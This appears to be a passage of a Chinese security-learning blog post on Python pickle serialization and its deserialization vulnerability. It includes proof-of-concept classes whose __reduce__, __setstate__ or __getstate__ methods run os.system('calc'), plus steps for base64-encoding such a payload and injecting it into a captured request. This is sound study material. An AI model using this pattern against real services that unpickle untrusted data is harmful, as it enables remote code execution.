</span><br><span class="line"># 从打开的文件对象中读取pickled对象表现形式并返回通过pickle反序列化后得到的Python对象</span><br><span class="line">load(file, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="python-2-X"><a href="#python-2-X" class="headerlink" title="python 2.X"></a>python 2.X</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; var_a = &#123;&#x27;a&#x27;:&#x27;str&#x27;, &#x27;c&#x27;: True, &#x27;e&#x27;: 10, &#x27;b&#x27;: 11.1, &#x27;d&#x27;: None, &#x27;f&#x27;: [1, 2, 3], &#x27;g&#x27;:(4, 5, 6)&#125;</span><br><span class="line"> </span><br><span class="line"># 序列化</span><br><span class="line">&gt;&gt;&gt; var_b = pickle.dumps(var_a)</span><br><span class="line">&gt;&gt;&gt; var_b</span><br><span class="line">&quot;(dp0\nS&#x27;a&#x27;\np1\nS&#x27;str&#x27;\np2\nsS&#x27;c&#x27;\np3\nI01\nsS&#x27;b&#x27;\np4\nF11.1\nsS&#x27;e&#x27;\np5\nI10\nsS&#x27;d&#x27;\np6\nNsS&#x27;g&#x27;\np7\n(I4\nI5\nI6\ntp8\nsS&#x27;f&#x27;\np9\n(lp10\nI1\naI2\naI3\nas.&quot;</span><br><span class="line"> </span><br><span class="line"># 反序列化</span><br><span class="line">&gt;&gt;&gt; var_c = pickle.loads(var_b)</span><br><span class="line">&gt;&gt;&gt; var_c</span><br><span class="line">&#123;&#x27;a&#x27;: &#x27;str&#x27;, &#x27;c&#x27;: True, &#x27;b&#x27;: 11.1, &#x27;e&#x27;: 10, &#x27;d&#x27;: None, &#x27;g&#x27;: (4, 5, 6), &#x27;f&#x27;: [1, 2, 3]&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="python-3-X"><a href="#python-3-X" class="headerlink" title="python 3.X"></a>python 3.X</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; var_a = &#123;&#x27;a&#x27;:&#x27;str&#x27;, &#x27;c&#x27;: True, &#x27;e&#x27;: 10, &#x27;b&#x27;: 11.1, &#x27;d&#x27;: None, &#x27;f&#x27;: [1, 2, 3], &#x27;g&#x27;:(4, 5, 6)&#125;</span><br><span class="line"> </span><br><span class="line"># 序列化</span><br><span class="line">&gt;&gt;&gt; var_b = pickle.dumps(var_a)</span><br><span class="line">&gt;&gt;&gt; var_b</span><br><span class="line">b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x00eq\x01K\nX\x01\x00\x00\x00aq\x02X\x03\x00\x00\x00strq\x03X\x01\x00\x00\x00fq\x04]q\x05(K\x01K\x02K\x03eX\x01\x00\x00\x00gq\x06K\x04K\x05K\x06\x87q\x07X\x01\x00\x00\x00bq\x08G@&amp;333333X\x01\x00\x00\x00cq\t\x88X\x01\x00\x00\x00dq\nNu.&#x27;</span><br><span class="line"> </span><br><span class="line"># 反序列化</span><br><span class="line">&gt;&gt;&gt; var_c = pickle.loads(var_b)</span><br><span class="line">&gt;&gt;&gt; var_c</span><br><span class="line">&#123;&#x27;e&#x27;: 10, &#x27;a&#x27;: &#x27;str&#x27;, &#x27;f&#x27;: [1, 2, 3], &#x27;g&#x27;: (4, 5, 6), &#x27;b&#x27;: 11.1, &#x27;c&#x27;: True, &#x27;d&#x27;: None&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="dump-与load"><a href="#dump-与load" class="headerlink" title="dump()与load()"></a>dump()与load()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">&gt;&gt;&gt; var_a = &#123;&#x27;a&#x27;:&#x27;str&#x27;, &#x27;c&#x27;: True, &#x27;e&#x27;: 10, &#x27;b&#x27;: 11.1, &#x27;d&#x27;: None, &#x27;f&#x27;: [1, 2, 3], &#x27;g&#x27;:(4, 5, 6)&#125;</span><br><span class="line"> </span><br><span class="line"># 持久化到文件</span><br><span class="line">&gt;&gt;&gt; with open(&#x27;pickle.txt&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">...     pickle.dump(var_a, f)</span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line"># 从文件中读取数据</span><br><span class="line">&gt;&gt;&gt; with open(&#x27;pickle.txt&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">...     var_b = pickle.load(f)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; var_b</span><br><span class="line">&#123;&#x27;e&#x27;: 10, &#x27;a&#x27;: &#x27;str&#x27;, &#x27;f&#x27;: [1, 2, 3], &#x27;g&#x27;: (4, 5, 6), &#x27;b&#x27;: 11.1, &#x27;c&#x27;: True, &#x27;d&#x27;: None&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><em>说明：</em></p>
+<p>默认情况下Python 2.x中pickled后的数据是字符串形式，需要将它转换为字节对象才能被Python 3.x中的pickle.loads()反序列化；Python 3.x中pickling所使用的协议是v3，因此需要在调用pickle.dumps()时指定可选参数protocol为Python 2.x所支持的协议版本（0,1,2），否则pickled后的数据不能被被Python 2.x中的pickle.loads()反序列化；</p>
+<p>Python 3.x中pickle.dump()和pickle.load()方法中指定的文件对象，必须以二进制模式打开，而Python 2.x中可以以二进制模式打开，也可以以文本模式打开。</p>
+<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62808713/article/details/130048382">Python反序列化漏洞及魔术方法详细全解（链构造、自动审计工具bandit）-CSDN博客</a></p>
+<p><strong>漏洞核心机制</strong>：Python的<code>pickle</code>模块在反序列化时不是简单地重建数据，而是<strong>通过执行字节码指令来重建对象</strong>。这意味着反序列化过程实际上是在执行代码。</p>
+<p>漏洞常见出现地：</p>
+<p>通常在解析认证<code>token</code>, <code>session</code>的时候. 现在很多<code>Web</code>服务都使用<code>redis</code>、<code>mongodb</code>、<code>memcached</code>等来存储<code>session</code>等状态信息.</p>
+<h3 id="Python魔术方法"><a href="#Python魔术方法" class="headerlink" title="Python魔术方法"></a>Python魔术方法</h3><p><code>__reduce__()</code> ：反序列化时调用。</p>
+<p><code>__reduce_ex__()</code> ：反序列化时调用。</p>
+<p><code>__setstate__()</code> ：反序列化时调用。</p>
+<p><code>__getstate__()</code> ：序列化时调用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">构造方法__new__</span><br><span class="line"></span><br><span class="line">在实例化一个类时自动被调用,是类的构造方法.</span><br><span class="line">可以通过重写__new__自定义类的实例化过程</span><br><span class="line">初始化方法__init__</span><br><span class="line"></span><br><span class="line">在__new__方法之后被调用,主要负责定义类的属性,以初始化实例</span><br><span class="line">析构方法__del__</span><br><span class="line"></span><br><span class="line">在实例将被销毁时调用</span><br><span class="line">只在实例的所有调用结束后才会被调用</span><br><span class="line">__getattr__</span><br><span class="line"></span><br><span class="line">获取不存在的对象属性时被触发</span><br><span class="line">存在返回值</span><br><span class="line">__setattr__</span><br><span class="line"></span><br><span class="line">设置对象成员值的时候触发</span><br><span class="line">传入一个self,一个要设置的属性名称,一个属性的值</span><br><span class="line">__repr__</span><br><span class="line"></span><br><span class="line">在实例被传入repr()时被调用</span><br><span class="line">必须返回字符串</span><br><span class="line">__call__</span><br><span class="line"></span><br><span class="line">把对象当作函数调用时触发</span><br><span class="line">__len__</span><br><span class="line"></span><br><span class="line">被传入len()时调用</span><br><span class="line">返回一个整型</span><br><span class="line">__str__</span><br><span class="line"></span><br><span class="line">被str(),format(),print()调用时调用,返回一个字符串</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id=""><a href="#" class="headerlink" title="&lt;__reduce__&gt;"></a>&lt;__reduce__&gt;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        print(&#x27;反序列化调用&#x27;)</span><br><span class="line">        return (os.system,(&#x27;calc&#x27;,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line">print(&#x27;===========&#x27;)</span><br><span class="line">print(p_a)</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//弹计算机</span><br><span class="line">反序列化调用</span><br><span class="line">===========</span><br><span class="line"></span><br><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x94.&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="-1"><a href="#-1" class="headerlink" title="&lt;__setstate__&gt;"></a>&lt;__setstate__&gt;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">class SerializePerson():</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    # 构造 __setstate__ 方法</span><br><span class="line">    def __setstate__(self, name):</span><br><span class="line">        os.system(&#x27;calc&#x27;)  # 恶意代码</span><br><span class="line"></span><br><span class="line">tmp = pickle.dumps(SerializePerson(&#x27;tom&#x27;))  # 序列化</span><br><span class="line">pickle.loads(tmp)  # 反序列化 此时会弹出计算器</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;弹计算机</p>
+<h3 id="-2"><a href="#-2" class="headerlink" title="&lt;__getstate__&gt;"></a>&lt;__getstate__&gt;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class A(object):</span><br><span class="line">    def __getstate__(self):</span><br><span class="line">        print(&#x27;序列化调用&#x27;)</span><br><span class="line">        os.system(&#x27;calc&#x27;)  # 执行系统命令，打开计算器</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)  # 序列化对象a</span><br><span class="line">print(&#x27;===========&#x27;)</span><br><span class="line">print(p_a)  # 打印序列化后的对象</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;弹计算机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">序列化调用</span><br><span class="line">===========</span><br><span class="line">b&#x27;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x01A\x94\x93\x94)\x81\x94.&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">class Demo(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        shell = &#x27;calc&#x27;</span><br><span class="line">        return (os.system,(shell,))</span><br><span class="line"></span><br><span class="line">demo = Demo()</span><br><span class="line">pickle.loads(pickle.dumps(demo))</span><br></pre></td></tr></table></figure>
+
+<p>在源代码中得知其会进行一次base64解码，所以我们需要对上面得到的序列化代码进行一次编码。对代码进行下面的修改。</p>
+<p><img src="/../images/20250408225934201.png" alt="image-20250408225934201"></p>
+<p><img src="/../images/20250408225950166.png" alt="image-20250408225950166"></p>
+<p>抓取数据包，在数据包内添加下面的内容。</p>
+<p><img src="/../images/20250408230011458.png" alt="image-20250408230011458"></p>
+<p>放包后可以看到计算器成功弹出。</p>
+<p>例题可以看ikun那题</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">python反序列化</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/../images/17384736097c9d.jpg" data-sizes="auto" alt="XYCTF2025比赛复现" class="lazyload">
+      
+      <a href="/2025/04/08/XYCTF2025%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          XYCTF2025比赛复现
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      fuboy
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        120.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        08:20
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">一、序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BA%8F%E5%88%97%E5%8C%96%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">1. 序列化是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">2. 反序列化是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81JSON"><span class="toc-number">2.</span> <span class="toc-text">二、JSON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">简介</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81JSON%E6%A8%A1%E5%9D%97"><span class="toc-number">3.</span> <span class="toc-text">三、JSON模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81JSON%E6%A8%A1%E5%9D%97%E5%AE%9E%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">四、JSON模块实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-dump%E5%92%8Cdumps%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">1. dump和dumps函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-load%E5%92%8Cloads%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.</span> <span class="toc-text">2. load和loads函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AF%BB%E5%8F%96%E5%A4%9A%E8%A1%8C%E7%9A%84JSON%E6%96%87%E4%BB%B6"><span class="toc-number">4.3.</span> <span class="toc-text">3. 读取多行的JSON文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81pickle%E6%A8%A1%E5%9D%97"><span class="toc-number">5.</span> <span class="toc-text">三、pickle模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E6%A8%A1%E5%9D%97%E4%B8%8Ejson%E6%A8%A1%E5%9D%97%E5%AF%B9%E6%AF%94"><span class="toc-number">5.1.</span> <span class="toc-text">pickle模块与json模块对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-2-X"><span class="toc-number">5.2.</span> <span class="toc-text">python 2.X</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-3-X"><span class="toc-number">5.3.</span> <span class="toc-text">python 3.X</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dump-%E4%B8%8Eload"><span class="toc-number">5.4.</span> <span class="toc-text">dump()与load()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.</span> <span class="toc-text">Python魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">6.2.</span> <span class="toc-text">&lt;__reduce__&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">6.3.</span> <span class="toc-text">&lt;__setstate__&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">6.4.</span> <span class="toc-text">&lt;__getstate__&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.5.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">89</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">66</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "fuboy",
+          title: "python反序列化",
+          url: "http://example.com/2025/04/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
+          excerpt: "",
+          description: "",
+          stripContent: "一、序列化和反序列化Python序列化与反序列化详解（包括json和json模块详解）_python json序列化和反序列化-CSDN博客 1. 序列化是什么？序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。 2. 反序列化是什么？反序列化 (Deserialization)是将有序的二进制序列转换成某种对象（字典，列表等）的过程。 用于进行数据序列化的模块：    模块名称 描述 提供的api    json 用于实现Python数据类型与通用（js",
+          date: "Tue Apr 08 2025 20:38:24 GMT+0800",
+          updated: "Tue Apr 08 2025 23:01:44 GMT+0800",
+          cover: "/../images/1737907114de8a.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
